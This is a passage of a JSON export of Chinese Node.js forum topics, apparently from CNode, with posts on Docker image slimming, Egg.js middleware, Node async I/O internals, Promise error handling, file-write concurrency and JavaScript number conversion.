alt=\"结果\"></p>\n<p>现在只剩下了65MB，相比刚开始已经减少了10倍多。</p>\n</li>\n<li>\n<h3>多阶段构建</h3>\n<ul>\n<li>\n<p>Docker镜像是分层的，Dockerfile中的每个指令都会创建一个新的镜像层，镜像层可以被复用和缓存。当Dockerfile的指令修改了，复制的文件变化了，或者构建镜像时指定的变量不同了，对应的镜像层缓存就会失效，某一层的镜像缓存失效之后，它之后的镜像层缓存都会失效。</p>\n</li>\n<li>\n<p>因此我们还可以将RUN指令合并，但是需要记住的是，我们只能将变化频率一致的指令合并。</p>\n</li>\n<li>\n<p>我们应该把变化最少的部分放在Dockerfile的前面，这样可以充分利用镜像缓存。</p>\n</li>\n<li>\n<p>通过最小化镜像层的数量，我们可以得到更小的镜像。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>上述示例中，源代码会经常变化，则每次构建镜像时都需要重新安装NPM模块，这显然不是我们希望看到的。因此我们可以先拷贝package.json，然后安装NPM模块，最后才拷贝其余的源代码。这样的话，即使源代码变化，也不需要重新安装NPM模块。</p>\n<pre class=\"prettyprint language-dockerfile\"><code>  FROM alpine AS builder\n  WORKDIR &#x2F;home&#x2F;app\n  RUN apk add --no-cache --update nodejs nodejs-npm\n  COPY package.json package-lock.json .&#x2F;\n  RUN npm install --production\n\n  FROM alpine\n  WORKDIR &#x2F;home&#x2F;app\n  RUN apk add --no-cache --update nodejs nodejs-npm\n  COPY --from=builder &#x2F;usr&#x2F;src&#x2F;app&#x2F;node_modules .&#x2F;node_modules\n  COPY . .\n  CMD [ &#x27;npm&#x27;, &#x27;start&#x27; ]\n</code></pre><p><img src=\"https://i.loli.net/2019/04/10/5cada07ba5f96.jpeg\" alt=\"结果\"></p>\n<p>最终的镜像只有51MB，比最开始大概减少了17倍！并且后续的 build 速度也大大提升。</p>\n<p>每一条 FROM 指令都是一个构建阶段，多条 FROM 就是多阶段构建，虽然最后生成的镜像只能是最后一个阶段的结果，但是，能够将前置阶段中的文件拷贝到后边的阶段中，这就是多阶段构建的最大意义。</p>\n<p>在上面的Dockerfile文件中，我们先 copy 了package.json，然后 npm install，在第二阶段构建时，我们直接 copy 了第一阶段已经下载好的node_moduls,在下一次 build 时，如果没有新增依赖，docker将使用缓存中的node_modules，这样就减少了部署的时间。</p>\n<p>使用 docker inspect imageId命令 我们可以看到，虽然我们有多个指令，但是最终的镜像也只有5层，这就是层的共享机制。</p>\n<p>使用多阶段构建可以充分利用Docker镜像的缓存，大大减少最终部署到生产环境的时间。</p>\n<h2>结论</h2>\n<p>在实际生产环境中，没有任何理由使用gb大小的镜像，如果你确实需要提高部署速度，并且被缓慢的CI/CD所困扰，那么多阶段构建将会是一个非常有帮助的方法</p>\n<p>希望这篇简短的文章对考虑使用Docker进行基于Node.js的应用程序开发或部署的人有些许帮助。</p>\n</div>","title":"Nodejs Docker 镜像体积优化实践","last_reply_at":"2019-04-12T05:27:40.704Z","good":false,"top":false,"reply_count":4,"visit_count":667,"create_at":"2019-04-10T08:29:03.659Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5c22034c3898674067a783fc","author_id":"5b52cbf1fb9e84ec69cc1ca2","tab":"share","content":"<div class=\"markdown-text\"><p>Vscode编辑器用中Angular7提示工具下载量马上达到750万，这意味这说什么？</p>\n<p>说实话Angular7.x相比React vue有更快的编译速度、更快的运行速度。难道王者归来。</p>\n<p><strong>Angular7入门视频教程网盘免费下</strong>：   <a href=\"https://pan.baidu.com/s/1dTItz3tEnP0GxPcExfH68g\">https://pan.baidu.com/s/1dTItz3tEnP0GxPcExfH68g</a></p>\n<p><img src=\"//static.cnodejs.org/Fp_oe68CGoTo4J8Vbpcqc_dVAFhQ\" alt=\"1.png\"></p>\n</div>","title":"Vscode编辑器中Angular7提示工具下载量达到750万 -这意味着什么？ 王者归来来吗？","last_reply_at":"2019-04-12T03:12:55.308Z","good":false,"top":false,"reply_count":26,"visit_count":3064,"create_at":"2018-12-25T10:15:40.046Z","author":{"loginname":"nodeper","avatar_url":"https://avatars2.githubusercontent.com/u/41500847?v=4&s=120"}},{"id":"5c4142063898674067a80677","author_id":"5c0678d9d3b8ab334e8dab20","tab":"share","content":"<div class=\"markdown-text\"><p>在Egg.js框架里面可以非常容易的引入 Koa 中间件生态，下面我们看看Egg.js中如何使用koa的中间件。</p>\n<p>koa-compress 是koa的中间件，下面我们看看Egg.js中如何使用koa-compress</p>\n<h3>1、使用koa-compress 开启服务器Gzip压缩功能，以 koa-compress 为例，在 Koa 中使用的方法：</h3>\n<pre class=\"prettyprint\"><code>const koa = require(&#x27;koa&#x27;);\nconst compress = require(&#x27;koa-compress&#x27;);\n\nconst app = koa();\n\nconst options = { threshold: 2048 };\napp.use(compress(options));\n</code></pre><h3>2、使用koa-compress 在Egg中使用的方法：</h3>\n<p><strong>1、新建app/middleware/compress.js 文件，然后在compress.js文件中写入下面代码</strong></p>\n<pre class=\"prettyprint\"><code>module.exports = require(&#x27;koa-compress&#x27;);\n</code></pre><p><strong>2、在config/config.default.js 中配置中间件</strong></p>\n<pre class=\"prettyprint\"><code>config.middleware = [&#x27;compress&#x27;];\nconfig.compress = { \nthreshold: 1024 &#x2F;&#x2F;它支持指定只有当 body 大于配置的 threshold 时才进行 gzip 压缩\n};\n</code></pre><p>这样我们就在egg中可以使用koa的中间件了 非常简单</p>\n</div>","title":"Egg.js中如何使用koa的中间件","last_reply_at":"2019-04-12T03:10:32.497Z","good":false,"top":false,"reply_count":2,"visit_count":816,"create_at":"2019-01-18T03:03:34.259Z","author":{"loginname":"sinazl","avatar_url":"https://avatars2.githubusercontent.com/u/44309893?v=4&s=120"}},{"id":"5cad657bdad66d658e407615","author_id":"5b39abe057137f22415c51eb","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FqUujCWTBs4lgrDXKMWcAWfLcY7n\" alt=\"image.png\">\n有大佬能解释一番么</p>\n</div>","title":"使用cnpm 安装sharp失败","last_reply_at":"2019-04-12T01:28:32.154Z","good":false,"top":false,"reply_count":3,"visit_count":632,"create_at":"2019-04-10T03:39:39.698Z","author":{"loginname":"nlbydcg","avatar_url":"https://avatars2.githubusercontent.com/u/40027034?v=4&s=120"}},{"id":"5cadb726207b2365936eb9d3","author_id":"5cadb69e207b2365936eb9ca","tab":"share","content":"<div class=\"markdown-text\"><p>一个简单的阅读webapp,技术栈vue+vue-router+webpack+vuex 线上地址：<a href=\"https://websevan.club/#/pages\">https://websevan.club/#/pages</a> 如有帮助 给个星星!\ngithub:<a href=\"https://github.com/shengxingwang/yuebook\">https://github.com/shengxingwang/yuebook</a></p>\n</div>","title":"一个vue开发简单的阅读webapp源码分享","last_reply_at":"2019-04-12T01:10:46.187Z","good":false,"top":false,"reply_count":1,"visit_count":484,"create_at":"2019-04-10T09:28:06.584Z","author":{"loginname":"shengxingwang","avatar_url":"https://avatars3.githubusercontent.com/u/22761197?v=4&s=120"}},{"id":"5caf476adad66d658e40816f","author_id":"5b31b09b57137f22415c4f4a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><strong>该文章阅读需要5分钟,更多文章请点击本人博客<a href=\"https://www.halu886.cn\">halu886</a></strong></p>\n</blockquote>\n<ul>\n<li><a href=\"#%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF\">事件循环</a></li>\n<li><a href=\"#%E8%A7%82%E5%AF%9F%E8%80%85\">观察者</a></li>\n<li><a href=\"#%E8%AF%B7%E6%B1%82%E5%AF%B9%E8%B1%A1\">请求对象</a></li>\n<li><a href=\"#%E6%89%A7%E8%A1%8C%E5%9B%9E%E8%B0%83\">执行回调</a></li>\n</ul>\n<h1>事件循环</h1>\n<p>正是事件循环，所以在Node中回调函数如此普遍。</p>\n<p>当进程启动时，Node会创建一个<code>while(true)</code>的循环，每执行一次循环称为一个Tick。Tick的过程首先判断是否有事件，如果有事件则取出事件，且判断判断是否有关联回调，执行关联回调。如果没有事件则退出进程。<br>\n<img src=\"http://resource.halu886.cn/images/async-io-3/1.png?x-oss-process=style/halu-blog-watermark\" alt=\"1\"></p>\n<h1>观察者</h1>\n<p>每个Tick如何判断是否有事件需要被处理呢？这里就需要引入观察者的概念了。\n每个事件循环都有一个或多个监听者，判断当前Tick是否事件需要处理就是询问这些监听者。</p>\n<p>浏览器的也存在监听者，例如一次点击或者加载一个文件。Node的事件则是网络请求，文件I/O。并且每种不同的事件都有对应的观察者。观察者将事件进行了分类。</p>\n<p>事件循环是一个生产者/消费者模型。异步I/O，网络请求负责生产事件，事件传递到监听者中，事件循环则从观察者中取出事件并拓展。</p>\n<p>在Windows中，这个循环基于IOCP创建，在*nix中，则是基于多线程创建。</p>\n<h1>请求对象</h1>\n<p>接下来我们将要举个例子来说明 在Windows中（基于IOCP）异步I/O从Javascript层到内核发生了什么。</p>\n<p>对于一般的非异步I/O回调函数，有我们自行调用。</p>\n<pre class=\"prettyprint language-js\"><code>var forEach = function(list,callback){\n     for(var i = 0; i &lt; list.length;i++){\n          callback(list[i],i,list);\n     }\n}\n</code></pre><p>对于Node的异步I/O，却不由开发者调用。从发起调用后，到调用被执行，中间到底发生了什么?其实从Javascript发起调用到内核执行完异步I/O，产生了一种中间产物，请求对象。</p>\n<p>接下来我们来一起学习一下<code>fs.open()</code>中的回调函数是是如何执行和调用的。</p>\n<pre class=\"prettyprint language-js\"><code>fs.open = function(path,flags,mode,callback){\n     &#x2F;&#x2F;...\n     binding.open(pathModule.makeLong(path),\n                    stringToFlags(flags),\n                    mode,\n                    callback);\n}\n</code></pre><p><code>fs.open()</code>的功能是指定文件路径和参数打开一个文件，获取一个文件描述符，这也是后续所有异步I/O的初始操作。其实Javascript层面是调用C++核心模块，获取文件描述符。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-io-3/2.png?x-oss-process=style/halu-blog-watermark\" alt=\"2\"></p>\n<p>从Javascript调用Node核心模块，核心模块调用C++内建模块，内建模块通过libuv系统调用，这是典型的Node的调用堆栈。libuv作为封装层，实际上调用uv_fs_open()方法。调用过程中，创建了一个FSReqWrap请求对象，所有参数和当前方法都封装在这个对象中，回调函数则被设置在这个对象中的oncomplete_sym属性中。</p>\n<pre class=\"prettyprint language-js\"><code>req_wrap-&gt;object-&gt;Set(oncomplete_sym,callback);\n</code></pre><p>对象包装完毕，在Windows中调用<code>QueueUserWorkItem()</code>把这个对象推入线程池中等待执行</p>\n<pre class=\"prettyprint language-js\"><code>QueueUserWorkItem(&amp;uv_fs_thread_proc,\n                         req,\n                         WT_EXECUTEDEFAULT)\n</code></pre><p><code>QueueUserWorkItem()</code>会接受三个参数，第一个参数是要被执行的方法的引用，第二个则是引用的方法的参数，第三个参数则是执行的标志。当线程池中有可用的参数时，<code>uv_fs_thread_proc()</code>则会通过参数的类型调用相应的底层函数，例如<code>uv_fs_open()</code>,其实调用的是<code>fs_open()</code>。</p>\n<p>至此，Javascript层面的异步I/O至此结束，然后Javascript线程接着执行当前任务的后续操作。当线程池中有空闲的线程时则执行I/O且不会阻塞Javascript线程的后续执行。</p>\n<p>请求对象是异步I/O的重要中间产物，所有状态都保存在这个请求对象中，包括送入线程池以及I/O操纵结束的回调函数执行。</p>\n<h1>执行回调</h1>\n<p>组装好请求对象，将对象送入I/O线程池等待执行，这才是第一步。第二步才是执行回调。</p>\n<p>线程I/O完成操作后，会将结果存储在req-&gt;result上。然后调用<code>PostQueueCompletionStatus()</code>通知IOCP，告知当前对象操作已经完成：</p>\n<pre class=\"prettyprint language-js\"><code>PostQueuedCompletionStatus((loop)-&gt;iocp,o,o,&amp;((req)-&gt;overlapped))\n</code></pre><p><code>PostQueuedCompletionStatus()</code>方法的作用就是向IOCP提交执行状态，并将线程返还给线程池。</p>\n<p>且在每次Tick的执行中，会调用IOCP的<code>GetQueuedCompletetionStatus()</code>检查线程池是否有执行完的请求。如果存在则将请求对象加入到I/O观察者的队列中，然后当作事件处理。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-io-3/3.png?x-oss-process=style/halu-blog-watermark\" alt=\"3\"></p>\n<blockquote>\n<p>以上知识点均来自&lt;&lt;深入浅出Node.js&gt;&gt;，更多细节建议阅读书籍:-)</p>\n</blockquote>\n</div>","title":"浅谈NodeJs异步I/O-3","last_reply_at":"2019-04-11T13:55:54.235Z","good":false,"top":false,"reply_count":0,"visit_count":374,"create_at":"2019-04-11T13:55:54.235Z","author":{"loginname":"halu886","avatar_url":"https://avatars1.githubusercontent.com/u/22374024?v=4&s=120"}},{"id":"5caf0e40207b2365936ec159","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>function fun(callback){\nPromise.then()\n.then(() =&gt; {})\n.then(() =&gt; {})\n.then(() =&gt; {callback()})\n.then(() =&gt; {})\n.then(() =&gt; {})\n}\n一个回调函数包含着一个promise,我想执行到callback就结束，而不执行后面的then,请问有什么优雅的写法么？</p>\n</div>","title":"promise多个then，如何不使用catch跳出中间的then","last_reply_at":"2019-04-11T11:36:08.482Z","good":false,"top":false,"reply_count":3,"visit_count":480,"create_at":"2019-04-11T09:52:00.524Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"56cd8a91842c03521a7351ec","author_id":"55f0f4159ae0f45035ae49b5","tab":"ask","content":"<div class=\"markdown-text\"><p>项目里面有个生成code128条形码的需求。</p>\n<p>开始在准备用https://github.com/birchroad/node-barc这个的，在win中安装node-convas时受阻，在centos的测试机上安装时又遇到了Package cairo这个问题，所以又找了另外一个，<a href=\"https://github.com/samt/barcode%E3%80%82\">https://github.com/samt/barcode。</a></p>\n<p>这个按照他提供的方法，运行的时候会报spawn gm enoent 这个错，参考帖子https://cnodejs.org/topic/51fc8bd944e76d216ab64939上说的，先后安装了gm、im 然后 npm install …，始终过不去上面那个错误。以上这一步在linux的测试机环境中也没通过。希望大家帮我找找原因。</p>\n</div>","title":"node 使用barcode生成条形码报错 spawn gm enoent","last_reply_at":"2019-04-11T11:21:33.305Z","good":false,"top":false,"reply_count":6,"visit_count":3029,"create_at":"2016-02-24T10:48:49.426Z","author":{"loginname":"loveitdoit","avatar_url":"https://avatars3.githubusercontent.com/u/12961611?v=4&s=120"}},{"id":"5ca5f4936c1de62dce467fed","author_id":"5ca1a9666c1de62dce4667d7","tab":"ask","content":"<div class=\"markdown-text\"><p>先上测试代码吧。</p>\n<blockquote>\n<p>var fs = require(‘fs’);\nvar i = 0;\nfs.writeFile(’./json’+i+’.json’, 1,function(err){\nif(err) console.log(‘写文件操作失败’);\nelse console.log(‘写文件操作成功 -1’);\n});\n//i++;\nfs.writeFile(’./json’+i+’.json’, 111,function(err){\nif(err) console.log(‘写文件操作失败’);\nelse console.log(‘写文件操作成功-2’);\n});\n//i++;</p>\n<p>fs.writeFile(’./json’+i+’.json’, 11111,function(err){\nif(err) console.log(‘写文件操作失败’);\nelse console.log(‘写文件操作成功-3’);\n});\n//i++;</p>\n<p>fs.writeFile(’./json’+i+’.json’, 1111111,function(err){\nif(err) console.log(‘写文件操作失败’);\nelse console.log(‘写文件操作成功-4’);\n});\n//i++;</p>\n<p>fs.writeFile(’./json’+i+’.json’, 111111111,function(err){\nif(err) console.log(‘写文件操作失败’);\nelse console.log(‘写文件操作成功-5’);\n});\n//i++;</p>\n<p>fs.writeFile(’./json’+i+’.json’, 222222222222,function(err){\nif(err) console.log(‘写文件操作失败-6’);\nelse console.log(‘写文件操作成功-6’);\n});</p>\n</blockquote>\n<p>同时发起六个写文件的操作，文件名称相同，也就是往同一个文件里面写数据。\n如果是单线程的话，那么是一个一个顺序执行，\n先执行第一个，把“1”写进去，\n然后执行第二个，把“111”写进去，同时覆盖上一次的操作“1”\n然后执行第三个，以此类推，最后文件里面剩下的只有“222222222222”。</p>\n<p>但是多次运行之后，结果很诡异。有时候文件里是“222222222222”，有的时候是“1”，这个可以理解为“入栈”的先后顺序不一致。</p>\n<p>但是有一次，文件内容是“111111122222”，还有一次内容是“111111111222”。</p>\n<p>这是什么鬼？这是哪来的？如果是单线程，一次只执行一个写入操作，内容绝对不会乱，会覆盖在意料之中。</p>\n<p>难道是传说中的“线程不安全”，但是node不是单线程的吗？</p>\n<p>难道六个写入操作，是同时进行的吗？而且还互相影响？！</p>\n</div>","title":"node写文件的并发问题，是同时写入，还是一个完成后再执行下一个？","last_reply_at":"2019-04-11T06:08:05.504Z","good":false,"top":false,"reply_count":7,"visit_count":977,"create_at":"2019-04-04T12:12:03.725Z","author":{"loginname":"jyk0011","avatar_url":"https://avatars0.githubusercontent.com/u/6062713?v=4&s=120"}},{"id":"5c876535acb681372d4175ce","author_id":"5c876456acb681372d4175c3","tab":"ask","content":"<div class=\"markdown-text\"><p>我是做h5游戏的 目前需要用到websocket\n我知道 node.js 自带的 socket可以传socket的句柄给其他进程\n但是ws的 怎么搞呢 我发现相关资料特别少\n求大佬们 指点迷津</p>\n</div>","title":"请问ws(websocket)模块如何做多进程呢？","last_reply_at":"2019-04-11T04:09:51.222Z","good":false,"top":false,"reply_count":2,"visit_count":624,"create_at":"2019-03-12T07:52:21.663Z","author":{"loginname":"shanxiaoda","avatar_url":"https://avatars3.githubusercontent.com/u/34155285?v=4&s=120"}},{"id":"5cae8157207b2365936ebb46","author_id":"5cae2d7f207b2365936ebb2f","tab":"share","content":"<div class=\"markdown-text\"><p>通过 Robotgo 绑定 JavaScript 和 python 等编程语言，实现 Golang 跨平台、跨语言桌面自动化, 控制鼠标、键盘、位图、屏幕、窗口句柄以及全局事件监听。</p>\n<p>项目地址: <a href=\"https://github.com/vcaesar/robotn\">https://github.com/vcaesar/robotn</a></p>\n<p>示例:</p>\n<pre class=\"prettyprint language-js\"><code>var robot = require(&#x27;robotn&#x27;);\n\nrobot.scroll(10, 10);\nrobot.mouseClick(&quot;left&quot;, true);\nrobot.moveSmooth(100, 200, 1.0, 100.0);\n\nvar fpid = robot.findIds(&quot;Google&quot;)\nconsole.log(&quot;pids... &quot;, fpid)\nif (fpid.length &gt; 0) {\n  robot.activePID(fpid[0])\n  robot.kill(fpid[0])\n}\n\nconsole.log(&quot;--- Please press ctrl + shift + q ---&quot;)\nvar ok = robotgo.AddEvents(&quot;q&quot;, &quot;ctrl&quot;, &quot;shift&quot;)\nif ok {\n    console.log((&quot;add events...&quot;)\n}\n</code></pre><p>python</p>\n<pre class=\"prettyprint language-py\"><code>import robot\n\nrobot.scroll(10, 10)\nrobot.mouseClick(&quot;left&quot;, true)\nrobot.moveSmooth(100, 200, 1.0, 100.0)\n</code></pre></div>","title":"Robotn,  使用 robotgo 绑定 JavaScript 和 Python 的跨平台桌面自动化系统","last_reply_at":"2019-04-11T02:54:39.407Z","good":false,"top":false,"reply_count":3,"visit_count":416,"create_at":"2019-04-10T23:50:47.917Z","author":{"loginname":"vcaesar","avatar_url":"https://avatars0.githubusercontent.com/u/16043470?v=4&s=120"}},{"id":"5caea4f7dad66d658e407bc7","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>译者按：</strong> 通过监听<strong>unhandledrejection</strong>事件，可以捕获未处理的Promise错误。</p>\n<ul>\n<li>原文: <a href=\"http://2ality.com/2016/04/unhandled-rejections.html\">Tracking unhandled rejected Promises</a></li>\n<li>译者: <a href=\"https://www.fundebug.com/\">Fundebug</a></li>\n</ul>\n<p><strong>为了保证可读性，本文采用意译而非直译，并且对源代码进行了大量修改。另外，本文版权归原作者所有，翻译仅用于学习。</strong></p>\n<p>使用<strong>Promise</strong>编写异步代码时，使用<strong>reject</strong>来处理错误。有时，开发者通常会忽略这一点，导致一些错误没有得到处理。例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>function main() {\n    asyncFunc()\n    .then(···)\n    .then(() =&gt; console.log(&#x27;Done!&#x27;));\n}\n</code></pre><p>由于没有使用<strong>catch</strong>方法捕获错误，当<strong>asyncFunc()<strong>函数</strong>reject</strong>时，抛出的错误则没有被处理。</p>\n<p>这篇博客将分别介绍在浏览器与Node.js中，如何捕获那些未处理的Promise错误。</p>\n<h3>浏览器中未处理的Promise错误</h3>\n<p>一些浏览器(例如Chrome)能够捕获未处理的Promise错误。</p>\n<h4>unhandledrejection</h4>\n<p>监听<strong>unhandledrejection</strong>事件，即可捕获到未处理的Promise错误：</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#x27;unhandledrejection&#x27;, event =&gt; ···);\n</code></pre><p>这个事件是<strong>PromiseRejectionEvent</strong>实例，它有2个最重要的属性：</p>\n<ul>\n<li><code>promise</code>: reject的Promise</li>\n<li><code>reason</code>: Promise的reject值</li>\n</ul>\n<p>示例代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#x27;unhandledrejection&#x27;, event =&gt;\n{\n    console.log(event.reason); &#x2F;&#x2F; 打印&quot;Hello, Fundebug!&quot;\n});\n\nfunction foo()\n{\n    Promise.reject(&#x27;Hello, Fundebug!&#x27;);\n}\n\nfoo();\n</code></pre><p><a href=\"https://www.fundebug.com/\">Fundebug</a>的<a href=\"https://docs.fundebug.com/notifier/javascript/\">JavaScript</a>错误监控插件监听了<strong>unhandledrejection</strong>事件，因此可以自动捕获未处理Promise错误。</p>\n<h4>rejectionhandled</h4>\n<p>当一个Promise错误最初未被处理，但是稍后又得到了处理，则会触发<strong>rejectionhandled</strong>事件：</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#x27;rejectionhandled&#x27;, event =&gt; ···);\n</code></pre><p>这个事件是<strong>PromiseRejectionEvent</strong>实例。</p>\n<p>示例代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#x27;unhandledrejection&#x27;, event =&gt;\n{\n    console.log(event.reason); &#x2F;&#x2F; 打印&quot;Hello, Fundebug!&quot;\n});\n\nwindow.addEventListener(&#x27;rejectionhandled&#x27;, event =&gt;\n{\n    console.log(&#x27;rejection handled&#x27;); &#x2F;&#x2F; 1秒后打印&quot;rejection handled&quot;\n});\n\n\nfunction foo()\n{\n    return Promise.reject(&#x27;Hello, Fundebug!&#x27;);\n}\n\nvar r = foo();\n\nsetTimeout(() =&gt;\n{\n    r.catch(e =&gt;{});\n}, 1000);\n</code></pre><h3>Node.js中未处理的Promise错误</h3>\n<p>监听<strong>unhandledRejection</strong>事件，即可捕获到未处理的Promise错误：</p>\n<pre class=\"prettyprint language-javascript\"><code>process.on(&#x27;unhandledRejection&#x27;, (reason, promise) =&gt; ···);\n</code></pre><p>示例代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>process.on(&#x27;unhandledRejection&#x27;, reason =&gt;\n{\n    console.log(reason); &#x2F;&#x2F; 打印&quot;Hello, Fundebug!&quot;\n});\n\nfunction foo()\n{\n    Promise.reject(&#x27;Hello, Fundebug!&#x27;);\n}\n\nfoo();\n</code></pre><p><strong>注:</strong> Node.js v6.6.0+ 默认会报告未处理的Promise错误，因此不去监听<strong>unhandledrejection</strong>事件也没问题。</p>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>的<a href=\"https://docs.fundebug.com/notifier/nodejs/\">Node.js</a>错误监控插件监听了<strong>unhandledRejection</strong>事件，因此可以自动捕获未处理Promise错误。</p>\n<h3>参考</h3>\n<ul>\n<li><a href=\"https://googlechrome.github.io/samples/promise-rejection-events/\">Promise Rejection Events Sample</a></li>\n<li><a href=\"https://nodejs.org/api/process.html#process_event_unhandledrejection\">Event: ‘unhandledRejection’</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2017/10/09/unhandled-pomise-rejection/\">https://blog.fundebug.com/2017/10/09/unhandled-pomise-rejection/</a></p>\n</div>","title":"捕获未处理的Promise错误","last_reply_at":"2019-04-11T02:22:47.438Z","good":false,"top":false,"reply_count":0,"visit_count":367,"create_at":"2019-04-11T02:22:47.438Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5ca56d836c1de62dce467bc1","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要</strong> ：JavaScript 是一个神奇的语言，字符串转数字有 5 种方法，各有各的坑法!</p>\n<ul>\n<li>原文: <a href=\"https://coderwall.com/p/5tlhmw/converting-strings-to-number-in-javascript-pitfalls\">Converting Strings to Number in Javascript: Pitfalls</a></li>\n<li>译者: <a href=\"https://www.fundebug.com/\">Fundebug</a></li>\n</ul>\n<p><strong>本文采用意译，版权归原作者所有</strong></p>\n<p>String 转换为 Number 有很多种方式，我可以想到的有 5 种！</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(num); &#x2F;&#x2F; 默认方式 (没有基数)\nparseInt(num, 10); &#x2F;&#x2F; 传入基数 (十位数)\nparseFloat(num); &#x2F;&#x2F; 浮点数\nNumber(num); &#x2F;&#x2F; Number 构造器\n~~num; &#x2F;&#x2F;按位非\nnum &#x2F; 1; &#x2F;&#x2F; 除一个数\nnum * 1; &#x2F;&#x2F; 乘一个数\nnum -\n0 + &#x2F;&#x2F; 减去0\n    num; &#x2F;&#x2F; 一元运算符 &quot;+&quot;\n</code></pre><p>选择哪一种呢？什么时候选择它？为什么选择这种它？我们逐一进行分析，并解析每种方式的常见陷阱。</p>\n<h3>parseInt</h3>\n<p>根据 <a href=\"http://JsPerf.com\">JsPerf.com</a> 的基准测试，大多数浏览器对 parseInt 的响应最佳。虽然它是最快的方式，但使用 preseInt 会碰到一些常见陷阱：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&quot;08&quot;); &#x2F;&#x2F; returns 0 部分老浏览器.\nparseInt(&quot;44.jpg&quot;); &#x2F;&#x2F; returns 44\n</code></pre><p><code>parseInt</code>: 没有传入基数时，默认是传入的基数为 10 <code>parseInt(num, 10)</code>，如果你不知道 num 属性的类型，不要使用 parseInt 进行字符串转数字。</p>\n<h3>parseFloat</h3>\n<p>如果你不解析 16 进制数，这是一个非常好的选择。例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(-0xff); &#x2F;&#x2F; returns -255\nparseInt(&quot;-0xFF&quot;); &#x2F;&#x2F; returns -255\nparseFloat(-0xff); &#x2F;&#x2F; returns -255\nparseFloat(&quot;-0xFF&quot;); &#x2F;&#x2F; returns 0\n</code></pre><p>注意：字符串中的负十六进制数字是一个特殊情况，如果你用 parseFloat 解析，结果是不正确的。为了避免程序出现 NaN 的情况，应该检查转化后的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&quot;44.jpg&quot;); &#x2F;&#x2F; return 44\n</code></pre><p><code>parseFloat</code>: 转换十六进制数时要小心，如果你不知道要转换对象的类型，不要使用 parseFloat。</p>\n<h3>按位非</h3>\n<p>可以把字符串转换成整数，但他不是浮点数。如果是一个字符串转换，它将返回 0；</p>\n<pre class=\"prettyprint language-javascript\"><code>~~1.23; &#x2F;&#x2F; returns 1\n~~&quot;1.23&quot;; &#x2F;&#x2F; returns 1\n~~&quot;23&quot;; &#x2F;&#x2F; returns 23\n~~&quot;Hello world&quot;; &#x2F;&#x2F; returns 0\n</code></pre><p>这是什么原理？通过<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators#.7E_(Bitwise_NOT)\">翻转</a>每个位，也称为数字的 A1 补码。你可以使用它，但注意只能用来存储整数。所以通常情况不要用它，除非你能确定这个数是在 32 位整数之间的值（因为调用的 ToInt32 的规范）。</p>\n<p><code>按位非</code>：用它确保输入中没有字符，仅用于整数。</p>\n<h3>Number</h3>\n<p>Number 与以上提及的转换方式一样存在这样的问题，解析时试图找出你给他的数字：</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(&quot;023&quot;); &#x2F;&#x2F; returns 23\nNumber(023); &#x2F;&#x2F; returns 19\n</code></pre><p>注意：023 实际上是一个八进制数，无论你怎么做，都是返回 19；对于没有单引号或双引号的十六进制数一样。</p>\n<p>Number 也是 JsPerf 中最慢的之一。</p>\n<p><code>Number</code>：几乎不用它。</p>\n<h3>一元运算符</h3>\n<pre class=\"prettyprint language-javascript\"><code>&quot;1.23&quot; * 1; &#x2F;&#x2F; returns 1.23\n&quot;0xFF&quot; - 0; &#x2F;&#x2F; returns 255\n&quot;0xFF.jpg&quot; &#x2F; 1 + &#x2F;&#x2F; returns NaN\n    &quot;023&quot;; &#x2F;&#x2F; returns 23\n</code></pre><p>一元运算符与其它的解析方式不同，如果是一个 NaN 值，那么返回的也是 NaN 。这是我最喜欢的数值转换方式，因为我认为任何带有字符的对象都不应该被视为 0 或者根据他有多少位来“猜”。我基本使用 <code>+</code> 操作符，因为这个方式不容易混淆。虽然 <code>-0</code> 的用法也很好，但它并没有很好的表达转换为数字的本意。</p>\n<h3>字符串转换为数字的方式总结</h3>\n<p>负十六进制数字符串转换为数字时。应首先将任何其转换为 String（例如通过 <code>+ &quot;&quot;</code> ），然后使用一元运算符或带基数的 parseInt 解析为数字。但是结果不是 NaN 的数值时，使用 parseFloat 更为合适。</p>\n<h3>关于Fundebug</h3>\n<p><a 